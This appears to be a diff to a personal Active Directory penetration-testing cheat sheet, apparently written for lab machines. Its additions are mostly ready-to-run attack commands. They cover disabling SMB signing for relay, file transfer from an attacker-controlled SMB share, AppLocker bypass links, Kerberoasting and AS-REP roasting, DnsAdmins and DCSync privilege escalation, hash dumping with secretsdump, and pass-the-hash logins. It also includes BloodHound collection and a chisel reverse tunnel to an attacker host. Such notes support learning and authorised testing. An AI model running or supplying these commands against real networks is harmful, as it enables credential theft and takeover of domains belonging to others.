@@ -16,9 +16,47 @@ rdate -n 10.10.10.52
 
 ## Enumerate
 
-### RPC
-https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
+#Bash
+```
+string | sed 's/^ *//' | awk '{print $2}' FS=">" | cut -d '<' -f 1 | awk {print $1$2}
+string | sed 's/^ *//' | awk '{print $2}' FS=">" | cut -d '<' -f 1 | awk {print substr($1,1,1),$2}
+```
 
+### RPC
+https://www.hackingarticles.in/active-directory-enumeration-rpcclient/ \
+https://raw.githubusercontent.com/s4vitar/rpcenum/master/rpcenum
+```
+./rpcenum -e DUsers -i IP
+./rpcenum -e DAUsers -i IP
+./rpcenum -e DGroups -i IP
+./rpcenum -e DUsersInfo -i IP
+```
+
+### SMB
+
+#SMB Relay
+```
+Set-SmbClientConfiguration -RequireSecuritySignature 0 -EnableSecuritySignature 0 -Confirm -Force
+```
+
+#SharedFiles
+```
+net use \\10.10.14.6\smbfolder /u:admin admin
+impacket-smbserver sobfolder . -smbsupport -username admin -password admin
+dir \\10.10.14.6\smbfolder\
+copy \\10.10.14.6\smbfolder\file c:\\users\user\appdata\local\temp\file
+```
+#PoweShell
+```
+IWR -URI url -OutFile file
+```
+
+### Blocked by group policy
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md \
+https://www.hacking-tutorial.com/hacking-tutorial/how-to-bypass-windows-applocker/ \
+```
+C:\Windows\Temp
+```
 
 ### Active Directory Enumeration: BloodHound
 https://www.hackingarticles.in/active-directory-enumeration-bloodhound/ \
@@ -38,8 +76,6 @@ Get-ADuser -Filter * -Properties * | select SamAccountName
 Get-ADuser -Filter * -Properties * | select servicePrincipalName
 Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'
 ```
-
-
 
 ### Enumerate logged-in and sessions users
 
@@ -149,9 +185,12 @@ nmap -n -sV --script "ldap* and not brute" 192.168.240.122
 ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"
 ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
 ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
+ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
+ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)' | grep namingContexts
+ldapsearch -x -H ldap://10.10.10.10 -b "DC=DOMAIN-N,DC=LOCAL" -s base '(objectclass=*)'
 ```
  
-## attacks
+## Attacks
 
 ### Spray Password Spraying
 https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/ \
@@ -178,6 +217,13 @@ PS C:> .\Spray-Passwords.ps1 -Pass pass123 -Admin  # -File to wordlist, -Admin t
 https://www.hackingarticles.in/abusing-kerberos-using-impacket/ \
 https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/ \
 https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/
+
+#Configurate Kerberoasting
+```console
+net localgroup Administrators domain\SVC_SQLService /add
+net localgroup Administradores domain\SVC_SQLService /add
+setspn -s http/domain.local:80 SVC_SQLService
+```
 
 #### Local attack 
 
@@ -245,8 +291,13 @@ hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --for
 
 ### ASPREPRoast - Get tickets without pwd
 https://www.hackingarticles.in/as-rep-roasting/
-
 #User configurate = DONT_REQ_PREAUTH - Create packet KRB_AS_REQ
+
+#Configure ASRepRoast
+```console
+Get-ADUser -identity SVC_SQLService -Properties * 
+Set-ADAccountControl SVC_SQLService -DoesNotRequiredPreAut $True
+```
 ```console
 rpcclient -U "jenriquez" -W "yuncorp.local" 192.168.100.20
 >enumdomusers
@@ -347,6 +398,15 @@ mimikatz # kerberos::list
 mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorporateWebServer.corporate.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
 ```
 
+### BloodHound
+```
+Import-module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+SharpHound.exe -c all --LdapUser user -LdapPass pass
+Get file-blood.zip
+Import to al GUI
+```
+
 ### Group Policy Object Enumeration
 ```console
 evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
@@ -369,6 +429,7 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ### ACL
 https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
 
+
 ### LAPS
 https://www.hackingarticles.in/credential-dumpinglaps/
 ```console
@@ -380,9 +441,34 @@ Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn
 Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
 ```
 
-### Priv Esc – DNSAdmins
+### Priv escalation – DNSAdmins
 https://www.youtube.com/watch?v=LiIqn-l2Stg&list=PLziMzyAZFGMf8rGjtpV6gYbx5hozUNeSZ&index=84&ab_channel=I.T%26Security
 
+#DNSAdmins
+```
+net localgroup "DnsAdmins" user /add
+```
+### Priv escalation -  Dcsync
+https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
+
+#DCSync requires a compromised user account with domain replication privileges
+#DS-Replication-Get-Changes, **Replicating Directory Changes All **and Replicating Directory Changes In Filtered Set
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+```
+```
+impacket-secretdump -just-dc user:pwd@IP
+impacket-secretdump -just-dc user:pwd@IP -history
+impacket-secretdump -just-dc-ntlm DOMAIN.LOCAL/user:pwd@IP
+evil-winrm -i IP -u Adminstrator -H NTLM 
+
+impacket-wmiexec -hashes :NTLM admiistrator@IP
+```
+
+### Priv Groups of member
+```
+whoami /all
+```
 
 ### Group Managed Service Accounts (GMSA)
 https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
@@ -530,3 +616,17 @@ To access resources of the domain, such as application with a registered SPN
 2. DC-KDC TGT decrypted_secret_key -- TGS_REP -->  Client.   # TGS_REP (SPN + session key to client and SPN) encrypted_session_key_TGT + (service ticket) encrypted_password_hash
 3. Cliente -- AP_ REQ --> Application.  # AP_REQ = Username + timestamp encrypted with the session key associated with the service ticket
 4. Application -- Service Autenticacion --> Client.
+
+
+
+## Port forwarding
+
+### Chisel
+#win
+```
+chisel client 10.10.14.6:8008 R:88:127.0.0.1:88 R:389:localhost:389
+```
+Linux
+```
+./chisel server -p 8008 --reverse
+```
